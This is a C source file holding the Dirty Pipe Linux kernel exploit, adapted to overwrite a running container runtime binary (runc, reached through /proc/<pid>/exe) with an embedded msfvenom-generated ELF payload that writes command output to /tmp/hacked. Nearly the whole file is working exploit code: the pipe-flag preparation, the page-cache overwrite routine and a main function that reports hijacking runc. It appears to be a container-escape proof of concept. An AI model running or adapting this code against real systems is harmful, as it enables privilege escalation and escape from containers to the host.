#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}
int hax(char *filename, long offset, uint8_t *data, size_t len) {
	/* open the input file and validate the specified offset */
	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return -1;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return -1;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return -1;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return -1;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, len);
	if (nbytes < 0) {
		perror("write failed");
		return -1;
	}
	if ((size_t)nbytes < len) {
		fprintf(stderr, "short write\n");
		return -1;
	}

	close(fd);

	return 0;
}

//
// NOTE: Everything above this line is the unchanged original Dirty Pipe PoC from dirtypipe.cm4all.com


// Generated using msfvenom -a x86 -p linux/x86/exec CMD="id > /tmp/hacked && hostname >> /tmp/hacked" -f elf
// Note: The first ELF byte is removed, since the Dirty Pipe exploit cannot write on the first byte of a memory page
const unsigned char malicious_elf_bytes[] = {
	/* 0x7f, */ 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xa3, 0x00, 0x00, 0x00,
  0xf2, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x6a, 0x0b, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68,
  0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52,
  0xe8, 0x2c, 0x00, 0x00, 0x00, 0x69, 0x64, 0x20, 0x3e, 0x20, 0x2f, 0x74,
  0x6d, 0x70, 0x2f, 0x68, 0x61, 0x63, 0x6b, 0x65, 0x64, 0x20, 0x26, 0x26,
  0x20, 0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x3e, 0x3e,
  0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x68, 0x61, 0x63, 0x6b, 0x65, 0x64,
  0x00, 0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80
};

int main(int argc, char **argv) {
	if (argc != 2) {
		fprintf(stderr, "Usage: %s /proc/<runc_pid>/exe\n", argv[0]);
		return EXIT_FAILURE;
	}

	char *path = argv[1];
	const size_t data_size = sizeof(malicious_elf_bytes);
	printf("[+] hijacking runc..\n");
	if (hax(path, 1, malicious_elf_bytes, data_size) != 0) {
		printf("[~] failed\n");
		return EXIT_FAILURE;
	}

	printf("[+] Successfuly overwrote runc with our malicious binary!\n");

	return EXIT_SUCCESS;
}